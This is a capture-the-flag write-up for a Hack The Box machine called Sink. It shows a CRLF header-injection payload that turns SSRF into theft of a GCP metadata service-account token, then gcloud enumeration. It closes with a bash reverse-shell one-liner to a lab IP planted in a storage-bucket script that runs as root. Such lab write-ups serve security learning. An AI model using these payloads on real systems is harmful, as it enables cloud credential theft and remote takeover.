---
title: "HTB: Sink"
tags: [htb, cloud, gcp, storage, metadata, ssrf, idor]

description: "Exploiting a custom header IDOR to access the GCP Metadata Service, leading to Service Account compromise."
---

# Hack The Box: Sink

**Machine IP**: `10.10.11.x`
**OS**: Cloud (GCP)
**Difficulty**: Hard

Sink is a masterclass in Google Cloud Platform (GCP) Security. The primary vector is accessing the **GCP Metadata Service**, which (unlike AWS V2) requires a specific header (`Metadata-Flavor: Google`) to prevent simple SSRF.

---

## 1. Reconnaissance

The web application is a "Note Taking App" allowing users to save links.
When we save a link, the server fetches it. This is classic **SSRF** (Server Side Request Forgery).

### The Obstacle
We try to fetch the metadata URL:
`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`

The server returns: `403 Forbidden`.
Why? GCP requires the header `Metadata-Flavor: Google`. A simple `curl` from the server (SSRF) won't send this header.

## 2. Exploitation (Traffic Splitting)

We audit the HTTP requests using **Burp Suite**.
We notice a custom header `X-Sink-Origin`.
We investigate if the application is vulnerable to **CRLF Injection** (Carriage Return Line Feed) or **Header Injection**.

By manipulating the input, we can force the server to inject our own headers into the request it makes.
**Payload**:
`http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:%20Google`
*(The `%0d%0a` is the newline character)*.

The application parses this, sees the newline, and interprets `Metadata-Flavor: Google` as a separate header.
**Success**. The server returns the JSON Access Token.

```json
{
  "access_token": "ya29.c.Kp0B...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

---

## 3. The Pivot (GCloud)

We now have the identity of the VM.
We install the `gcloud` SDK and authenticate.

```bash
gcloud auth login --cred-file=token.json
```

We enumerate the project resources.
```bash
gcloud storage ls
```

We find a bucket: `gs://sink-backup-scripts`.
We examine the permissions/contents. It contains a script `backup.sh` that runs automatically on instances.

## 4. Persistence & Privilege Escalation

We create a new version of `backup.sh` containing a reverse shell.
```bash
echo "bash -i >& /dev/tcp/10.10.14.14/4444 0>&1" > backup.sh
gsutil cp backup.sh gs://sink-backup-scripts/
```

We wait for the cron job (or startup event) to trigger.
The VM pulls the script and executes it as **root**.

## Conclusion
Sink demonstrates that while Cloud Providers add protections (like the Metadata header), application vulnerabilities (Header Injection) can bypass them entirely.
